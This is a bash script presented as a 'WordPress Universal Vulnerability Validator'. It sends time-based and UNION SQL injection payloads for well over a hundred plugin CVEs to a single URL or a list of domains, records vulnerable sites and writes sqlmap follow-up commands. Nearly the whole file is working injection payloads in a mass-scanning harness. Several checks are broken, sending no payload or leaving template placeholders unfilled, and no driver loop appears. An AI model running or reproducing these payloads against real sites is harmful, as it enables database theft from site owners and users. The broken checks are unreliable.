#!/bin/bash
# ============================================================
# WordPress Universal Vulnerability Validator
# 194 CVEs: SQLi, Auth Bypass, PrivEsc
# Usage: ./validate_wp_sqli.sh [-o DIR] [--csv] <url|domains.txt|nuclei_out.txt>
# ============================================================
set -euo pipefail
IFS=$'\n\t'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'
SLEEP_SEC=6
THRESHOLD=5
TIMEOUT=12
CSV_MODE=0
OUTDIR="/tmp/wp_validate_$(date +%Y%m%d_%H%M%S)"

POSITIONAL=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        -o) OUTDIR="$2"; shift 2 ;;
        --csv) CSV_MODE=1; shift ;;
        *) POSITIONAL+=("$1"); shift ;;
    esac
done
set -- "${POSITIONAL[@]:-}"

mkdir -p "$OUTDIR"
RESULTS_FILE="${OUTDIR}/results.txt"
SQLMAP_FILE="${OUTDIR}/sqlmap_commands.txt"
VULN_FILE="${OUTDIR}/vuln_domains.txt"
FULL_LOG="${OUTDIR}/full_log.txt"
CSV_FILE="${OUTDIR}/results.csv"

exec > >(tee -a "$FULL_LOG") 2>&1
[ "$CSV_MODE" -eq 1 ] && [ ! -f "$CSV_FILE" ] && echo "domain,cve,type,payload,status" > "$CSV_FILE"

log_vuln() {
    local DOMAIN="$1" CVE="$2" STATUS="$3" PAYLOAD="$4"
    local TYPE="${5:-exploit}"
    echo -e "${RED}  [VULN] ${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}${NC}"
    echo "${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}" >> "$RESULTS_FILE"
    echo "$DOMAIN" >> "$VULN_FILE"
    if [ "$CSV_MODE" -eq 1 ]; then
        local SP; SP=$(echo "$PAYLOAD" | sed 's/"/""/g')
        printf '"%s","%s","%s","%s","%s"\n' "$DOMAIN" "$CVE" "$TYPE" "$SP" "$STATUS" >> "$CSV_FILE"
    fi
}
log_safe() { echo -e "${GREEN}  [SAFE] ${1} | ${2} | ${3}${NC}"; }
add_sqlmap() { echo "$1" >> "$SQLMAP_FILE"; }

time_check() {
    local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" SL="${4:-$SLEEP_SEC}"
    local START; START=$(date +%s)
    curl -sk -o /dev/null -m $((SL+TIMEOUT)) -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
    echo $(( $(date +%s) - START ))
}

time_check_h() {
    local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" HDR="${4:-}" SL="${5:-$SLEEP_SEC}"
    local START; START=$(date +%s)
    curl -sk -o /dev/null -m $((SL+TIMEOUT)) -H "$HDR" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
    echo $(( $(date +%s) - START ))
}

http_probe() {
    local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" CT="${4:-application/x-www-form-urlencoded}"
    curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "Content-Type: ${CT}" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
}

plugin_check() {
    local BASE_URL="$1" SLUG="$2"
    [ -z "$SLUG" ] && return 0
    local HTTP; HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/${SLUG}/readme.txt" 2>/dev/null || echo 000)
    [ "$HTTP" = "200" ]
}

# Generic time-based GET (payload already in URL)
check_time_get() {
    local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4" ENDPOINT="$5"
    echo -e "\n${YELLOW}[${CVE}] plugin=${PLUGIN:-core} | GET time-based${NC}"
    if [ -n "$PLUGIN" ] && ! plugin_check "$BASE_URL" "$PLUGIN"; then
        echo -e "${RED}  Plugin not found${NC}"; return
    fi
    local DUR; DUR=$(time_check "${BASE_URL}${ENDPOINT}")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "GET time-based sleep=${DUR}s" "sqli"
        add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${ENDPOINT}' --technique=T --dbms=MySQL --batch"
    else
        log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"
    fi
}

# Generic time-based POST
check_time_post() {
    local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4" ENDPOINT="$5" BODY="$6"
    echo -e "\n${YELLOW}[${CVE}] plugin=${PLUGIN:-core} | POST time-based${NC}"
    if [ -n "$PLUGIN" ] && ! plugin_check "$BASE_URL" "$PLUGIN"; then
        echo -e "${RED}  Plugin not found${NC}"; return
    fi
    local DUR; DUR=$(time_check "${BASE_URL}${ENDPOINT}" POST "$BODY")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "POST time-based sleep=${DUR}s" "sqli"
        add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${ENDPOINT}' --data='${BODY}' --technique=T --dbms=MySQL --batch"
    else
        log_safe "$DOMAIN" "$CVE" "no delay (${DUR}s)"
    fi
}

# Generic md5/union GET
check_md5_get() {
    local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4" ENDPOINT="$5"
    local PROBE=999999999
    echo -e "\n${YELLOW}[${CVE}] plugin=${PLUGIN:-core} | GET md5/union${NC}"
    if [ -n "$PLUGIN" ] && ! plugin_check "$BASE_URL" "$PLUGIN"; then
        echo -e "${RED}  Plugin not found${NC}"; return
    fi
    local HASH; HASH=$(echo -n $PROBE | md5sum | cut -d' ' -f1)
    local BODY; BODY=$(curl -sk -m "$TIMEOUT" "${BASE_URL}${ENDPOINT}" 2>/dev/null || true)
    if echo "$BODY" | grep -q "$HASH"; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "md5(${PROBE})=${HASH} in response" "sqli"
        add_sqlmap "# ${CVE}: sqlmap -u '${BASE_URL}${ENDPOINT}' --technique=U --dbms=MySQL --batch"
    else
        log_safe "$DOMAIN" "$CVE" "md5 not found"
    fi
}

# Auth-required: plugin presence only
check_plugin_only() {
    local BASE_URL="$1" DOMAIN="$2" CVE="$3" PLUGIN="$4"
    echo -e "\n${YELLOW}[${CVE}] plugin=${PLUGIN:-?} | auth-required: checking plugin presence${NC}"
    if [ -z "$PLUGIN" ] || ! plugin_check "$BASE_URL" "$PLUGIN"; then
        echo -e "${RED}  Plugin not found${NC}"; return
    fi
    log_vuln "$DOMAIN" "$CVE" "PLUGIN_PRESENT" "${PLUGIN} installed — requires auth: use nuclei -t wp_sqli/${CVE}.yaml" "sqli"
}

_check_CVE_2015_2196() { check_time_get "$1" "$2" 'CVE-2015-2196' 'spider_calendar' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json'; }
_check_CVE_2015_4062() { check_plugin_only "$1" "$2" 'CVE-2015-4062' 'newstatpress'; }
_check_CVE_2015_9323() { check_plugin_only "$1" "$2" 'CVE-2015-9323' '404_to_301'; }
_check_CVE_2016_10940() { check_plugin_only "$1" "$2" 'CVE-2016-10940' 'zm-gallery'; }
_check_CVE_2017_8295() { check_plugin_only "$1" "$2" 'CVE-2017-8295' ''; }
_check_CVE_2018_16159() { check_time_post "$1" "$2" 'CVE-2018-16159' 'gift-voucher' '/wp-admin/admin-ajax.php' 'action=wpgv_doajax_front_template&template_id=1 and sleep(6)#'; }
_check_CVE_2019_10692() { check_plugin_only "$1" "$2" 'CVE-2019-10692' 'wp_go_maps'; }
_check_CVE_2020_11530() { check_time_get "$1" "$2" 'CVE-2020-11530' 'chop_slider' '/wp-content/plugins/chopslider/get_script/index.php?id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))A)'; }
_check_CVE_2020_13640() { check_plugin_only "$1" "$2" 'CVE-2020-13640' 'wpdiscuz'; }
_check_CVE_2020_14092() { check_plugin_only "$1" "$2" 'CVE-2020-14092' 'paypal_pro'; }
_check_CVE_2020_27481() { check_time_post "$1" "$2" 'CVE-2020-27481' 'good_learning_management_system' '/wp-admin/admin-ajax.php' 'action=gdlr_lms_cancel_booking&id=(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))MrMV)'; }
_check_CVE_2020_27615() { check_time_get "$1" "$2" 'CVE-2020-27615' 'loginizer' '/wp-content/plugins/loginizer/readme.txt'; }
_check_CVE_2020_5766() { check_time_get "$1" "$2" 'CVE-2020-5766' 'srs-simple-hits-counter' '/'; }
_check_CVE_2020_8772() { check_plugin_only "$1" "$2" 'CVE-2020-8772' 'iwp-client'; }
_check_CVE_2021_24139() { check_time_get "$1" "$2" 'CVE-2021-24139' 'photo_gallery' '/index.php?rest_route=/wp/v2/pages'; }
_check_CVE_2021_24285() { check_plugin_only "$1" "$2" 'CVE-2021-24285' 'cars-seller-auto-classifieds-script'; }
_check_CVE_2021_24295() { check_plugin_only "$1" "$2" 'CVE-2021-24295' 'cleantalk-spam-protect'; }
_check_CVE_2021_24340() { check_time_get "$1" "$2" 'CVE-2021-24340' 'wp-statistics' '/wp-content/plugins/wp-statistics/readme.txt'; }
_check_CVE_2021_24442() { check_time_post "$1" "$2" 'CVE-2021-24442' 'polls-widget' '/wp-admin/admin-ajax.php?action=pollinsertvalues' 'question_id=1&poll_answer_securety=8df73ed4ee&date_answers%5B0%5D=SLEEP(5)'; }
_check_CVE_2021_24554() { check_plugin_only "$1" "$2" 'CVE-2021-24554' 'paytm-pay'; }
_check_CVE_2021_24627() { check_plugin_only "$1" "$2" 'CVE-2021-24627' 'g-auto-hyperlink'; }
_check_CVE_2021_24666() { check_md5_get "$1" "$2" 'CVE-2021-24666' 'podlove_podcast_publisher' '/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('; }
_check_CVE_2021_24731() { check_time_post "$1" "$2" 'CVE-2021-24731' 'pie_register' '/wp-json/pie/v1/login' 'user_login='\''+AND+(SELECT+8149+FROM+(SELECT(SLEEP(3)))NuqO)+AND+'\''YvuB'\''='\''YvuB&login_pass=a'; }
_check_CVE_2021_24750() { check_plugin_only "$1" "$2" 'CVE-2021-24750' 'wp_visitor_statistics_\(real_time_traffic\)'; }
_check_CVE_2021_24762() { check_time_get "$1" "$2" 'CVE-2021-24762' 'perfect_survey' '/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(7)))HQYx)'; }
_check_CVE_2021_24786() { check_plugin_only "$1" "$2" 'CVE-2021-24786' 'download-monitor'; }
_check_CVE_2021_24791() { check_plugin_only "$1" "$2" 'CVE-2021-24791' 'header_footer_code_manager'; }
_check_CVE_2021_24827() { check_time_get "$1" "$2" 'CVE-2021-24827' 'asgaros_forum' '/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6)'; }
_check_CVE_2021_24849() { check_time_get "$1" "$2" 'CVE-2021-24849' 'wc-multivendor-marketplace' '/wp-content/plugins/wc-multivendor-marketplace/readme.txt'; }
_check_CVE_2021_24862() { check_plugin_only "$1" "$2" 'CVE-2021-24862' 'registrationmagic'; }
_check_CVE_2021_24915() { check_plugin_only "$1" "$2" 'CVE-2021-24915' 'contest-gallery'; }
_check_CVE_2021_24931() { check_time_get "$1" "$2" 'CVE-2021-24931' 'secure_copy_content_protection_and_content_locking' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json'; }
_check_CVE_2021_24943() { check_time_post "$1" "$2" 'CVE-2021-24943' 'registrations-for-the-events-calendar' '/wp-admin/admin-ajax.php?action=rtec_send_unregister_link' 'event_id=3 AND (SELECT 1874 FROM (SELECT(SLEEP(5)))vNpy)&email={{text}}@{{text}}.com'; }
_check_CVE_2021_24946() { check_time_get "$1" "$2" 'CVE-2021-24946' 'modern_events_calendar_lite' '/wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g'; }
_check_CVE_2021_25114() { check_time_get "$1" "$2" 'CVE-2021-25114' 'paid-memberships-pro' '/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g'; }
_check_CVE_2021_32789() { check_plugin_only "$1" "$2" 'CVE-2021-32789' 'woocommerce_blocks'; }
_check_CVE_2022_0169() { check_md5_get "$1" "$2" 'CVE-2022-0169' 'photo-gallery' '/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,concat(md5({{num}}),%200x2c,%208),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20g'; }
_check_CVE_2022_0228() { check_plugin_only "$1" "$2" 'CVE-2022-0228' 'popup-builder'; }
_check_CVE_2022_0349() { check_time_post "$1" "$2" 'CVE-2022-0349' 'notificationx' '/?rest_route=/notificationx/v1/analytics' 'nx_id=sleep(6) -- x'; }
_check_CVE_2022_0412() { check_time_get "$1" "$2" 'CVE-2022-0412' 'ti_woocommerce_wishlist' '/?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(7)%20--%20g'; }
_check_CVE_2022_0434() { check_md5_get "$1" "$2" 'CVE-2022-0434' 'page_view_count' '/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g'; }
_check_CVE_2022_0439() { check_plugin_only "$1" "$2" 'CVE-2022-0439' ''; }
_check_CVE_2022_0479() { check_plugin_only "$1" "$2" 'CVE-2022-0479' 'popup-builder'; }
_check_CVE_2022_0592() { check_time_get "$1" "$2" 'CVE-2022-0592' 'mapsvg' '/wp-json/mapsvg/v1/maps/2?id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)--+'; }
_check_CVE_2022_0651() { check_time_get "$1" "$2" 'CVE-2022-0651' 'wp-statistics' '/'; }
_check_CVE_2022_0658() { check_time_post "$1" "$2" 'CVE-2022-0658' 'commonsbooking' '/wp-admin/admin-ajax.php' 'action=calendar_data&sd=2099-02-13&ed=2099-02-13&item=1&location=(SELECT+1743+FROM+(SELECT(SLEEP(6)))iXxL3)'; }
_check_CVE_2022_0693() { check_time_get "$1" "$2" 'CVE-2022-0693' 'master_elements' '/wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition'; }
_check_CVE_2022_0747() { check_time_post "$1" "$2" 'CVE-2022-0747' 'infographic_maker' '/wp-admin/admin-ajax.php' 'action=qcld_upvote_action&post_id=1+AND+(SELECT+1626+FROM+(SELECT(SLEEP(6)))niPH)'; }
_check_CVE_2022_0760() { check_time_post "$1" "$2" 'CVE-2022-0760' 'simple_link_directory' '/wp-admin/admin-ajax.php' 'action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(7))enz)'; }
_check_CVE_2022_0769() { check_time_post "$1" "$2" 'CVE-2022-0769' 'users_ultra' '/wp-admin/admin-ajax.php' 'action=rating_vote&data_id=1&data_target=vote_score+%3d+1+AND+(SELECT+3+FROM+(SELECT(SLEEP(6)))gwe)--+'; }
_check_CVE_2022_0773() { check_time_post "$1" "$2" 'CVE-2022-0773' 'documentor' '/wp-admin/admin-ajax.php' 'action=doc_search_results&term=&docid=1+AND+(SELECT+6288+FROM+(SELECT(SLEEP(6)))HRaz)'; }
_check_CVE_2022_0781() { check_md5_get "$1" "$2" 'CVE-2022-0781' 'nirweb_support' '/wp-admin/admin-ajax.php'; }
_check_CVE_2022_0783() { check_time_post "$1" "$2" 'CVE-2022-0783' 'multiple-shipping-address-woocommerce' '/wp-admin/admin-ajax.php' 'action=ocwma_choice_address&sid=3+AND+(SELECT+1946+FROM+(SELECT(SLEEP(7)))zsme)'; }
_check_CVE_2022_0784() { check_time_post "$1" "$2" 'CVE-2022-0784' 'title_experiments_free' '/wp-admin/admin-ajax.php' 'action=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(6)))je)'; }
_check_CVE_2022_0785() { check_time_get "$1" "$2" 'CVE-2022-0785' 'daily_prayer_time' '/wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)'; }
_check_CVE_2022_0786() { check_time_get "$1" "$2" 'CVE-2022-0786' 'kivicare' '/wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b'; }
_check_CVE_2022_0787() { check_time_post "$1" "$2" 'CVE-2022-0787' 'limit_login_attempts' '/wp-admin/admin-ajax.php' 'action=WPLFLA_get_log_data&order[][column]=0&columns[][data]=(SELECT+7382+FROM+(SELECT(SLEEP(6)))ameU)'; }
_check_CVE_2022_0788() { check_time_get "$1" "$2" 'CVE-2022-0788' 'wp_fundraising_donation_and_crowdfunding_platform' '/index.php?rest_route=/xs-donate-form/payment-redirect/3'; }
_check_CVE_2022_0814() { check_plugin_only "$1" "$2" 'CVE-2022-0814' 'ubigeo-peru'; }
_check_CVE_2022_0817() { check_md5_get "$1" "$2" 'CVE-2022-0817' 'badgeos' '/wp-admin/admin-ajax.php'; }
_check_CVE_2022_0826() { check_time_post "$1" "$2" 'CVE-2022-0826' 'wp-video-gallery-free' '/wp-admin/admin-ajax.php' 'action=wp_video_gallery_ajax_add_single_youtube&url=http://oast.me/?x%26v=1%2522 AND (SELECT 1780 FROM (SELECT(SLEEP(6)))uPaz)%2523'; }
_check_CVE_2022_0827() { check_time_post "$1" "$2" 'CVE-2022-0827' 'bestbooks' '/wp-admin/admin-ajax.php' 'action=bestbooks_add_transaction&type=x&account=x&date=x&description=1&debit=(CASE WHEN (9277=9277) THEN SLEEP(6) ELSE 9277 END)&credit=1'; }
_check_CVE_2022_0846() { check_time_post "$1" "$2" 'CVE-2022-0846' 'speakout\!_email_petitions' '/wp-admin/admin-ajax.php' 'action=dk_speakout_sendmail&id=12+AND+(SELECT+5023+FROM+(SELECT(SLEEP(6)))Fvrh)--+VoFu'; }
_check_CVE_2022_0867() { check_time_post "$1" "$2" 'CVE-2022-0867' 'pricing_table' '/wp-admin/admin-ajax.php' 'action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)'; }
_check_CVE_2022_0948() { check_time_post "$1" "$2" 'CVE-2022-0948' 'order_listener_for_woocommerce' '/?rest_route=/olistener/new' '{"id":" (SLEEP(6))#"}'; }
_check_CVE_2022_0949() { check_time_post "$1" "$2" 'CVE-2022-0949' 'block_and_stop_bad_bots' '/wp-admin/admin-ajax.php' 'action=stopbadbots_grava_fingerprint&fingerprint=0'; }
_check_CVE_2022_1013() { check_time_post "$1" "$2" 'CVE-2022-1013' 'personal_dictionary' '/wp-admin/admin-ajax.php' 'action=ays_pd_ajax&function=ays_pd_game_find_word&groupsIds[]=1)+AND+(SELECT+3066+FROM+(SELECT(SLEEP(7)))CEHy)--+-'; }
_check_CVE_2022_1057() { check_time_get "$1" "$2" 'CVE-2022-1057' 'pricing_deals_for_woocommerce' '/wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-'; }
_check_CVE_2022_1453() { check_time_get "$1" "$2" 'CVE-2022-1453' '' '/wp-json/rsvpmaker/v1/sked/1?post_id=(SELECT%209999%20FROM%20(SELECT(SLEEP(7)))a)'; }
_check_CVE_2022_1768() { check_time_post "$1" "$2" 'CVE-2022-1768' 'rsvpmaker' '/wp-json/rsvpmaker/v1/stripesuccess/anythinghere' 'rsvp_id=(select(0)from(select(sleep(7)))a)&amount=1234&email=randomtext'; }
_check_CVE_2022_1950() { check_time_post "$1" "$2" 'CVE-2022-1950' 'youzify' '/wp-admin/admin-ajax.php' 'action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=(SELECT 7958 FROM (SELECT(SLEEP(6)))XVfJ)'; }
_check_CVE_2022_21661() { check_plugin_only "$1" "$2" 'CVE-2022-21661' 'wordpress'; }
_check_CVE_2022_25148() { check_time_get "$1" "$2" 'CVE-2022-25148' 'wp-statistics' '/'; }
_check_CVE_2022_25149() { check_time_get "$1" "$2" 'CVE-2022-25149' 'wp-statistics' '/'; }
_check_CVE_2022_3142() { check_plugin_only "$1" "$2" 'CVE-2022-3142' 'nex-forms-express-wp-form-builder'; }
_check_CVE_2022_3254() { check_plugin_only "$1" "$2" 'CVE-2022-3254' ''; }
_check_CVE_2022_33965() { check_time_get "$1" "$2" 'CVE-2022-33965' 'wp-stats-manager' '/?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'\''+and+sleep(7)+or+'\'''; }
_check_CVE_2022_3481() { check_time_post "$1" "$2" 'CVE-2022-3481' 'woocommerce-dropshipping' '/wp-json/woo-aliexpress/v1/product-sku' '{"sku":"a\" AND (SELECT 42 FROM (SELECT(SLEEP(7)))wlHd)-- pOeU"}'; }
_check_CVE_2022_3768() { check_plugin_only "$1" "$2" 'CVE-2022-3768' 'wpsmartcontracts'; }
_check_CVE_2022_4049() { check_time_get "$1" "$2" 'CVE-2022-4049' 'wp-user' '{{path}}'; }
_check_CVE_2022_4050() { check_time_post "$1" "$2" 'CVE-2022-4050' 'joomsport' '/wp-admin/admin-ajax.php?action=joomsport_md_load' 'mdId=1&shattr={"id":"1+AND+(SELECT+1+FROM(SELECT+SLEEP(7))aaaa);--+-"}'; }
_check_CVE_2022_4059() { check_time_get "$1" "$2" 'CVE-2022-4059' 'cryptocurrency-widgets-pack' '/wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&order[0][column]=0&columns[0][name]=name+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))aaaa)--+-'; }
_check_CVE_2022_4117() { check_time_post "$1" "$2" 'CVE-2022-4117' 'iws-geo-form-fields' '/wp-admin/admin-ajax.php?action=iws_gff_fetch_states' 'country_id=1%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)'; }
_check_CVE_2022_4447() { check_md5_get "$1" "$2" 'CVE-2022-4447' 'fontsy' '/wp-admin/admin-ajax.php?action=get_tag_fonts'; }
_check_CVE_2022_44588() { check_time_get "$1" "$2" 'CVE-2022-44588' 'cryptocurrency-widgets-pack' '/wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&draw=1&start=0&length=10&columns[0][name]=EXP(~(SELECT*FROM(SELECT+SLEEP(8))x))&order[0][column]=0&order[0][dir]=ASC'; }
_check_CVE_2022_45805() { check_plugin_only "$1" "$2" 'CVE-2022-45805' 'payment_gateway'; }
_check_CVE_2022_45808() { check_time_post "$1" "$2" 'CVE-2022-45808' 'learnpress' '/wp-json/lp/v1/courses/archive-course' 'c_search=X&order_by=ID AND (SELECT 1471 FROM (SELECT(SLEEP(6)))VcSO)&order=DESC&limit=10&return_type=html'; }
_check_CVE_2023_0037() { check_time_post "$1" "$2" 'CVE-2023-0037' 'map_builder_for_google_maps' '/' 'radius=1+and+(SELECT+7741+FROM+(SELECT(SLEEP(7)))hlAf)&lat=0.0&lng=0.0&distance_in=km'; }
_check_CVE_2023_0261() { check_plugin_only "$1" "$2" 'CVE-2023-0261' 'wp_tripadvisor_review_slider'; }
_check_CVE_2023_0600() { check_time_get "$1" "$2" 'CVE-2023-0600' 'wp-stats-manager' '/wp-content/plugins/wp-statistics/readme.txt'; }
_check_CVE_2023_0630() { check_plugin_only "$1" "$2" 'CVE-2023-0630' 'slimstat_analytics'; }
_check_CVE_2023_0900() { check_plugin_only "$1" "$2" 'CVE-2023-0900' 'ap-pricing-tables-lite'; }
_check_CVE_2023_1020() { check_plugin_only "$1" "$2" 'CVE-2023-1020' 'wp_live_chat_shoutbox'; }
_check_CVE_2023_1408() { check_plugin_only "$1" "$2" 'CVE-2023-1408' 'video-list-manager'; }
_check_CVE_2023_1730() { check_time_get "$1" "$2" 'CVE-2023-1730' 'supportcandy' '/'; }
_check_CVE_2023_23488() { check_time_get "$1" "$2" 'CVE-2023-23488' 'paid-memberships-pro' '/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-'; }
_check_CVE_2023_23489() { check_time_get "$1" "$2" 'CVE-2023-23489' 'easy_digital_downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
_check_CVE_2023_24000() { check_time_get "$1" "$2" 'CVE-2023-24000' 'gamipress' '/wp-json/wp/v2/gamipress-logs?trigger_type[]=test'\'')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20('\''a'\''='\''a'; }
_check_CVE_2023_2437() { check_plugin_only "$1" "$2" 'CVE-2023-2437' 'userpro'; }
_check_CVE_2023_2449() { check_plugin_only "$1" "$2" 'CVE-2023-2449' 'userpro'; }
_check_CVE_2023_28121() { check_plugin_only "$1" "$2" 'CVE-2023-28121' 'woocommerce-payments'; }
_check_CVE_2023_28662() { check_time_get "$1" "$2" 'CVE-2023-28662' 'gift-voucher' '/wp-content/plugins/gift-voucher/readme.txt'; }
_check_CVE_2023_28787() { check_time_get "$1" "$2" 'CVE-2023-28787' '' '/'; }
_check_CVE_2023_3076() { check_plugin_only "$1" "$2" 'CVE-2023-3076' 'mstore-api'; }
_check_CVE_2023_3077() { check_time_get "$1" "$2" 'CVE-2023-3077' 'mstore-api' '/wp-json/api/flutter_booking/get_staffs?product_id=%27+or+ID=sleep(6)--+-'; }
_check_CVE_2023_3197() { check_time_get "$1" "$2" 'CVE-2023-3197' '' '/wp-json/api/flutter_multi_vendor/product-categories'; }
_check_CVE_2023_32243() { check_plugin_only "$1" "$2" 'CVE-2023-32243' 'essential-addons-for-elementor-lite'; }
_check_CVE_2023_32590() { check_time_post "$1" "$2" 'CVE-2023-32590' '' '/wp-json/textmagic/v1/smsreceived' '{"sender": "1'\'' AND (SELECT 1 FROM (SELECT(SLEEP(10)))sqltest) AND '\''1'\''='\''1","text": "test"}'; }
_check_CVE_2023_3460() { check_plugin_only "$1" "$2" 'CVE-2023-3460' 'ultimate-member'; }
_check_CVE_2023_4490() { check_time_post "$1" "$2" 'CVE-2023-4490' 'wp-job-portal' '/wp-job-portal-jobseeker-controlpanel/jobs' 'jobtitle=aaaa&salarytype=&salaryfixed=&salarymin=&salarymax=&salaryduration=2&duration=&city=(select*from(select(sleep(7)))a)&metakeywords=&save=Search+Job&default_longitude=71.2577233&default_latitud'; }
_check_CVE_2023_50839() { check_time_post "$1" "$2" 'CVE-2023-50839' '' '/js-support-ticket-controlpanel/' 'form_request=jssupportticket&jstmod=ticket&task=showticketstatus&email=test@test.com'\'' AND SLEEP(8)-- -&ticketid=test123'; }
_check_CVE_2023_5203() { check_plugin_only "$1" "$2" 'CVE-2023-5203' ''; }
_check_CVE_2023_5204() { check_time_post "$1" "$2" 'CVE-2023-5204' '' '/wp-admin/admin-ajax.php' 'action=wpbo_search_response&name=test&keyword=test&strid=1 AND (SELECT 42 FROM (SELECT(SLEEP(8)))sqltest)'; }
_check_CVE_2023_5652() { check_time_post "$1" "$2" 'CVE-2023-5652' '' '/wp-admin/admin-ajax.php' 'action=x&taxonomy=hb_room_type&hb_room_type_ordering[1]=0 END, name=(SELECT SLEEP(8)), term_id=CASE when 1=1 THEN 1'; }
_check_CVE_2023_6009() { check_plugin_only "$1" "$2" 'CVE-2023-6009' 'userpro'; }
_check_CVE_2023_6030() { check_time_get "$1" "$2" 'CVE-2023-6030' '' '/wp-content/plugins/logdash-activity-log/README.txt'; }
_check_CVE_2023_6063() { check_time_get "$1" "$2" 'CVE-2023-6063' 'wp-fastest-cache' '/wp-login.php'; }
_check_CVE_2023_6360() { check_time_get "$1" "$2" 'CVE-2023-6360' 'my-calendar' '/wp-content/plugins/my-calendar/readme.txt'; }
_check_CVE_2023_6567() { check_time_get "$1" "$2" 'CVE-2023-6567' 'learnpress' '/wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1'; }
_check_CVE_2023_7337() { check_plugin_only "$1" "$2" 'CVE-2023-7337' ''; }
_check_CVE_2024_0705() { check_time_get "$1" "$2" 'CVE-2024-0705' '' '/'; }
_check_CVE_2024_10400() { check_md5_get "$1" "$2" 'CVE-2024-10400' 'tutor' '/wp-admin/admin-ajax.php'; }
_check_CVE_2024_1061() { check_time_get "$1" "$2" 'CVE-2024-1061' 'html5_video_player' '/?rest_route=/h5vp/v1/view/1&id=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
_check_CVE_2024_1071() { check_time_get "$1" "$2" 'CVE-2024-1071' 'ultimate-member' '/?p=1'; }
_check_CVE_2024_10924() { check_plugin_only "$1" "$2" 'CVE-2024-10924' 'really-simple-ssl'; }
_check_CVE_2024_11728() { check_time_get "$1" "$2" 'CVE-2024-11728' 'kivicare-clinic-management-system' '/'; }
_check_CVE_2024_12025() { check_time_get "$1" "$2" 'CVE-2024-12025' '' '/wp-json/collapsing-categories/v1/get?showPosts=1&taxonomy=category%27%29+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-'; }
